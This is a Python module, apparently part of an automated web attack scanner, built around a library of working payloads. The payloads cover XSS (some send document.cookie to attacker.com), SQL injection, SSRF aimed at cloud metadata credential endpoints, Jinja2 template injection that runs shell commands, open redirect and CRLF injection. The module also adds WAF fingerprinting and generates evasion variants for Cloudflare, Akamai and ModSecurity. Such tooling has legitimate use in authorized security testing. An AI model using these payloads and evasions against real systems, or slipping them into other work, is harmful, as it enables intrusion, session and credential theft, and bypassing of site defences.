"""Payload Intelligence System v2.

- Payload telemetry and success tracking
- WAF detection and evasion adaptation
- Endpoint-aware and parameter-aware payload selection
- Reflected-context analysis (HTML/JS/attr/URL)
- DOM-aware payload selection
- Payloads evolve based on scan results
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

from app.intelligence.reasoning import ReasoningAgentBase


class ReflectionContext(str, Enum):
    HTML_TEXT    = "html_text"
    HTML_ATTR    = "html_attr"
    JS_STRING_SQ = "js_string_sq"
    JS_STRING_DQ = "js_string_dq"
    JS_TEMPLATE  = "js_template"
    URL_PARAM    = "url_param"
    URL_PATH     = "url_path"
    CSS          = "css"
    JSON_VALUE   = "json_value"
    DOM          = "dom"
    UNKNOWN      = "unknown"


class WAFSignature(str, Enum):
    CLOUDFLARE  = "cloudflare"
    AKAMAI      = "akamai"
    AWS_WAF     = "aws_waf"
    IMPERVA     = "imperva"
    SUCURI      = "sucuri"
    MODSECURITY = "modsecurity"
    UNKNOWN     = "unknown"
    NONE        = "none"


@dataclass
class PayloadFamily:
    name: str
    vuln_type: str
    context: ReflectionContext
    payloads: list[str] = field(default_factory=list)
    waf_evasions: dict[str, list[str]] = field(default_factory=dict)
    success_rate: float = 0.0
    waf_block_rate: float = 0.0

    def best_payload(self, waf: WAFSignature = WAFSignature.NONE) -> str:
        if waf != WAFSignature.NONE and waf.value in self.waf_evasions:
            evasions = self.waf_evasions[waf.value]
            if evasions:
                return evasions[0]
        return self.payloads[0] if self.payloads else ""

    def all_payloads(self, waf: WAFSignature = WAFSignature.NONE, limit: int = 10) -> list[str]:
        base = self.payloads[:limit]
        if waf != WAFSignature.NONE and waf.value in self.waf_evasions:
            evasions = self.waf_evasions[waf.value][:5]
            return evasions + [p for p in base if p not in evasions]
        return base


PAYLOAD_LIBRARY: dict[str, list[PayloadFamily]] = {
    "xss": [
        PayloadFamily(
            name="xss_html_text",
            vuln_type="xss",
            context=ReflectionContext.HTML_TEXT,
            payloads=[
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<input autofocus onfocus=alert(1)>",
                "<video src=x onerror=alert(1)>",
            ],
            waf_evasions={
                "cloudflare": [
                    "<img src=x onerror=confirm(1)>",
                    "<svg/onload=alert(1)>",
                    "<<script>alert(1)//<</script>",
                    "<img src=x oNerRoR=alert(1)>",
                ],
                "modsecurity": [
                    "<sCRipt>alert(1)</sCRipt>",
                    "<img src=x onerror=&#97;lert(1)>",
                    "<svg onload=&#97;lert&#40;1&#41;>",
                ],
                "akamai": [
                    "<img src=x onerror=top['al'+'ert'](1)>",
                    "<script>eval(atob('YWxlcnQoMSk='))</script>",
                ],
            },
        ),
        PayloadFamily(
            name="xss_html_attr",
            vuln_type="xss",
            context=ReflectionContext.HTML_ATTR,
            payloads=[
                "\" onmouseover=\"alert(1)\"",
                "\" onfocus=\"alert(1)\" autofocus=\"",
                "\" onload=\"alert(1)\"",
                "javascript:alert(1)",
                "\" onclick=\"alert(1)\" x=\"",
                "' onmouseover='alert(1)'",
                "\" style=\"animation-name:rotation\" onanimationstart=\"alert(1)\"",
            ],
            waf_evasions={
                "cloudflare": [
                    "\" onpointerover=\"alert(1)\"",
                    "\" onmouseenter=\"alert(1)\"",
                ],
            },
        ),
        PayloadFamily(
            name="xss_js_string",
            vuln_type="xss",
            context=ReflectionContext.JS_STRING_SQ,
            payloads=[
                "';alert(1)//",
                "'-alert(1)-'",
                "\\';alert(1)//",
                "'; alert(document.cookie); var x='",
                "';fetch('//attacker.com?c='+document.cookie)//",
            ],
        ),
        PayloadFamily(
            name="xss_js_string_dq",
            vuln_type="xss",
            context=ReflectionContext.JS_STRING_DQ,
            payloads=[
                "\"-alert(1)-\"",
                "\";alert(1)//",
                "\"; fetch('//attacker.com?c='+document.cookie)//",
            ],
        ),
        PayloadFamily(
            name="xss_dom",
            vuln_type="xss",
            context=ReflectionContext.DOM,
            payloads=[
                "#<img src=x onerror=alert(1)>",
                "#\"><img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "#'-alert(1)-'",
                "data:text/html,<script>alert(1)</script>",
            ],
        ),
    ],
    "sqli": [
        PayloadFamily(
            name="sqli_error_mysql",
            vuln_type="sqli",
            context=ReflectionContext.URL_PARAM,
            payloads=[
                "'",
                "''",
                "' OR 1=1--",
                "' OR '1'='1",
                "' UNION SELECT null--",
                "' UNION SELECT null,null--",
                "' UNION SELECT null,null,null--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            waf_evasions={
                "modsecurity": [
                    "' /*!OR*/ 1=1--",
                    "' /*!UNION*/ /*!SELECT*/ null--",
                    "'/**/OR/**/1=1--",
                ],
                "cloudflare": [
                    "1' AND '1'='1",
                    "1 OR 1=1",
                ],
            },
        ),
        PayloadFamily(
            name="sqli_time_based",
            vuln_type="sqli",
            context=ReflectionContext.URL_PARAM,
            payloads=[
                "' AND SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1; SELECT pg_sleep(5)--",
                "' OR SLEEP(5)='",
            ],
        ),
    ],
    "ssrf": [
        PayloadFamily(
            name="ssrf_cloud_metadata",
            vuln_type="ssrf",
            context=ReflectionContext.URL_PARAM,
            payloads=[
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/instance/",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
            ],
            waf_evasions={
                "unknown": [
                    "http://0x7f000001/",
                    "http://2130706433/",
                    "http://[::1]/",
                    "http://0177.0.0.1/",
                    "http://169.254.169.254.xip.io/",
                    "http://169.254.169.254%20/",
                ],
            },
        ),
        PayloadFamily(
            name="ssrf_internal",
            vuln_type="ssrf",
            context=ReflectionContext.URL_PARAM,
            payloads=[
                "http://localhost:8080/",
                "http://10.0.0.1/",
                "http://192.168.1.1/",
                "http://172.16.0.1/",
                "file:///etc/passwd",
                "dict://localhost:6379/",
            ],
        ),
    ],
    "ssti": [
        PayloadFamily(
            name="ssti_detect",
            vuln_type="ssti",
            context=ReflectionContext.URL_PARAM,
            payloads=[
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%=7*7%>",
                "{7*7}",
                "{{7*'7'}}",
                "${{7*7}}",
                "@(7*7)",
            ],
        ),
        PayloadFamily(
            name="ssti_jinja2_rce",
            vuln_type="ssti",
            context=ReflectionContext.URL_PARAM,
            payloads=[
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()[0]}}",
                "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
            ],
        ),
    ],
    "open_redirect": [
        PayloadFamily(
            name="open_redirect_basic",
            vuln_type="open_redirect",
            context=ReflectionContext.URL_PARAM,
            payloads=[
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "https://evil.com%2F@legitimate.com",
                "https://legitimate.com.evil.com",
                "https://evil.com?legitimate.com",
                "javascript:alert(1)",
                "data:text/html,<script>document.location='https://evil.com'</script>",
            ],
        ),
    ],
    "crlf": [
        PayloadFamily(
            name="crlf_inject",
            vuln_type="crlf",
            context=ReflectionContext.URL_PARAM,
            payloads=[
                "%0d%0aSet-Cookie:session=evil",
                "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
                "\r\nSet-Cookie:session=evil",
                "%0a%0dSet-Cookie:session=evil",
                "%E5%98%8A%E5%98%8DSet-Cookie:session=evil",
            ],
        ),
    ],
}


class PayloadIntelligenceSystem(ReasoningAgentBase):
    """Context-aware, adaptive payload selection and mutation engine."""

    agent_name = "payload_intelligence"

    def detect_reflection_context(self, response_body: str, payload: str) -> ReflectionContext:
        """Detect where in the response a payload is reflected."""
        if not payload or payload not in response_body:
            return ReflectionContext.UNKNOWN

        idx = response_body.find(payload)
        surrounding = response_body[max(0, idx-100):idx+len(payload)+100]

        # Check if inside a script tag
        script_open = response_body.rfind("<script", 0, idx)
        script_close = response_body.rfind("</script>", 0, idx)
        if script_open > script_close:
            # Inside JS — check string context
            if "'" in surrounding[max(0, surrounding.find(payload)-20):surrounding.find(payload)]:
                return ReflectionContext.JS_STRING_SQ
            return ReflectionContext.JS_STRING_DQ

        # Check if inside an attribute
        attr_pattern = re.compile(r'<[^>]+(?:href|src|action|data|value|onclick|onload)=["\'][^"\']*')
        if attr_pattern.search(surrounding):
            return ReflectionContext.HTML_ATTR

        # Check for JSON context
        if '"' + payload + '"' in response_body or "'" + payload + "'" in response_body:
            return ReflectionContext.JSON_VALUE

        return ReflectionContext.HTML_TEXT

    def detect_waf(self, response: dict[str, Any]) -> WAFSignature:
        """Detect WAF from response headers and body."""
        headers = {k.lower(): v.lower() for k, v in response.get("headers", {}).items()}
        body = response.get("body", "").lower()
        status = response.get("status_code", 200)

        if "cf-ray" in headers or "cloudflare" in headers.get("server", ""):
            return WAFSignature.CLOUDFLARE
        if "x-akamai-transformed" in headers or "akamai" in headers.get("server", ""):
            return WAFSignature.AKAMAI
        if "x-amzn-requestid" in headers or "aws" in body[:200]:
            return WAFSignature.AWS_WAF
        if "x-iinfo" in headers or "incapsula" in body[:200]:
            return WAFSignature.IMPERVA
        if "x-sucuri-id" in headers:
            return WAFSignature.SUCURI
        if status == 403 and any(x in body for x in ["mod_security", "modsecurity", "not acceptable"]):
            return WAFSignature.MODSECURITY

        return WAFSignature.NONE

    def select_payloads(
        self,
        vuln_type: str,
        context: ReflectionContext = ReflectionContext.UNKNOWN,
        waf: WAFSignature = WAFSignature.NONE,
        param_name: str = "",
        limit: int = 8,
        memory_best: list[str] | None = None,
    ) -> list[str]:
        """Select the best payloads for a given context."""
        families = PAYLOAD_LIBRARY.get(vuln_type, [])
        if not families:
            return []

        # Select best family for context
        exact_match = [f for f in families if f.context == context]
        best_family = exact_match[0] if exact_match else families[0]

        self.select_payload(
            best_family.best_payload(waf),
            rationale=f"Context={context.value}, WAF={waf.value}, Family={best_family.name}",
            context=context.value,
            confidence=0.7 if waf == WAFSignature.NONE else 0.6,
        )

        payloads = best_family.all_payloads(waf, limit)

        # Prepend memory-proven payloads
        if memory_best:
            payloads = memory_best[:3] + [p for p in payloads if p not in memory_best]

        # Parameter-aware mutation
        if param_name:
            payloads = self._mutate_for_param(payloads, param_name, vuln_type)

        return payloads[:limit]

    def _mutate_for_param(
        self, payloads: list[str], param_name: str, vuln_type: str
    ) -> list[str]:
        """Adapt payloads based on the parameter name context."""
        param_lower = param_name.lower()

        # URL parameters — add URL-encoding variants
        if vuln_type == "xss" and any(x in param_lower for x in ["url", "link", "href", "src"]):
            url_payloads = ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]
            return url_payloads + payloads

        # Numeric parameters — add numeric-context payloads
        if vuln_type == "sqli" and any(x in param_lower for x in ["id", "num", "page", "limit", "offset"]):
            numeric = ["1 AND SLEEP(5)", "1 OR 1=1", "1 UNION SELECT null--"]
            return numeric + payloads

        return payloads

    def generate_waf_evasions(self, payload: str, waf: WAFSignature) -> list[str]:
        """Generate WAF evasion variants of a given payload."""
        evasions: list[str] = []

        if waf in (WAFSignature.CLOUDFLARE, WAFSignature.AKAMAI, WAFSignature.MODSECURITY):
            # Case randomization
            evasions.append("".join(
                c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)
            ))
            # HTML entity encoding
            evasions.append(payload.replace("<", "&#60;").replace(">", "&#62;"))
            # Double encoding
            evasions.append(payload.replace("<", "%3C").replace(">", "%3E"))
            # Comment insertion (for SQLi)
            if "--" in payload or "OR" in payload.upper():
                evasions.append(payload.replace(" ", "/**/"))
            # Unicode normalization
            evasions.append(payload.replace("script", "scr\u0131pt"))

        return evasions

    def analyze_parameter_for_xss_context(
        self, url: str, param: str, response_body: str
    ) -> dict[str, Any]:
        """Analyze where a parameter is reflected to determine XSS payload type."""
        # Insert a canary and detect reflection context
        canary = "BMXCANARY12345"
        if canary not in response_body:
            return {"context": ReflectionContext.UNKNOWN, "payloads": []}

        ctx = self.detect_reflection_context(response_body, canary)
        payloads = self.select_payloads("xss", ctx)

        return {
            "context": ctx.value,
            "reflection_found": True,
            "payloads": payloads,
            "rationale": f"Canary reflected in {ctx.value} context",
        }
